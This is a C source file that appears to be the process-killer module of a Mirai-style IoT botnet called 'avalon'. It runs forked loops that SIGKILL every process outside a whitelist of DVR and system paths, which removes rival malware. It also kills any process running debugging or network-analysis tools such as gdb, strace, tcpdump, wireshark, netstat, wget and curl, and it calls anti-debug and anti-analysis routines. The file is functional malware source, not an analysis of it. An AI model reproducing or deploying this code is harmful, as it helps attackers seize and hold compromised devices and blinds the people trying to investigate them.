#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/table.h"
#include "headers/utils.h"

int killer_pid = 0;

char *whitelistpaths[] = {
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "ibox",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "l0 c/udevd",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "/var/Condi",
    "sshd",
    "/usr/compress/bin/",
    "/compress/bin",
    "/compress/usr/",
    "httpd",
    "encoder",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/"};

void kill_malware(pid_t current_pid) {
    DIR *dir = opendir("/proc/");
    if (dir == NULL) {
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char *name = entry->d_name;
            if (name[0] >= '0' && name[0] <= '9') {
                pid_t pid = util_atoi(name, 10);
                if (pid != current_pid) {
                    char path[PATH_MAX];
                    util_snprintf(path, sizeof(path), "/proc/%s/exe", name);
                    char exe_path[PATH_MAX + 1];
                    ssize_t len = readlink(path, exe_path, sizeof(exe_path) - 1);
                    if (len != -1) {
                        exe_path[len] = '\0';

                        char current_exe_path[PATH_MAX + 1];
                        ssize_t current_len = readlink("/proc/self/exe", current_exe_path, sizeof(current_exe_path) - 1);
                        if (current_len != -1) {
                            current_exe_path[current_len] = '\0';
                        }

                        if (util_strcmp(exe_path, current_exe_path)) {
                            continue;
                        }

                        if (util_strcmp(exe_path, "/usr/bin/.sh")) {
                            continue;
                        }

                        if (strstr(exe_path, current_exe_path) != NULL) {
                            continue;
                        }

                        int is_whitelisted = 0;
                        for (int i = 0; i < sizeof(whitelistpaths) / sizeof(whitelistpaths[0]); i++) {
                            if (strstr(exe_path, whitelistpaths[i]) != NULL) {
                                is_whitelisted = 1;
                                break;
                            }
                        }
                        if (!is_whitelisted) {
                            kill(pid, SIGKILL);
                            #ifdef DEBUG
                            printf("(avalon/killer) killing pid %d (path: %s)\n", pid, exe_path);
                            #endif
                        }
                    }
                }
            }
        }
    }

    closedir(dir);
	usleep(100000);
}

void lock_commands() {
    DIR *dir;
    struct dirent *entry;
    pid_t pid;
    char path[PATH_MAX];

    dir = opendir("/proc");
    if (dir == NULL) {
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && util_atoi(entry->d_name, 10) > 0) {
            pid = (pid_t) util_atoi(entry->d_name, 10);
            util_snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
            FILE *cmdline = fopen(path, "r");
            if (cmdline) {
                char cmd[PATH_MAX];
                fgets(cmd, sizeof(cmd), cmdline);
                fclose(cmdline);

                if (strstr(cmd, "netstat") != NULL || strstr(cmd, "wget") != NULL || strstr(cmd, "curl") != NULL || strstr(cmd, "busybox") != NULL || strstr(cmd, "/bin/busybox") != NULL ||
                    strstr(cmd, "gdb") != NULL || strstr(cmd, "strace") != NULL || strstr(cmd, "valgrind") != NULL ||
                    strstr(cmd, "wireshark") != NULL || strstr(cmd, "tcpdump") != NULL || strstr(cmd, "tshark") != NULL || strstr(cmd, "ethereal") != NULL) {
                    #ifdef DEBUG
                    printf("(killer/locker) process with pid %d (%s) found and killed.\n", pid, cmd);
                    #endif
                    kill(pid, SIGKILL);
                }
            }
        }
    }

    closedir(dir);
}

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

void killer_init(void) {
    #ifdef DEBUG
        printf("(avalon/killer) killer starting with pid %d.\n", killer_pid);
    #endif
    pid_t current_pid = getpid();

    if (!fork()) {
        while (1) {
            util_anti_debug();
            util_anti_analysis();
            kill_malware(current_pid);
            usleep(5000 * 1000);
        }
    }
	if (!fork()) {
        while (1) {
            util_anti_debug();
            util_anti_analysis();
            lock_commands();
            usleep(2000 * 1000);
        }
    }
}
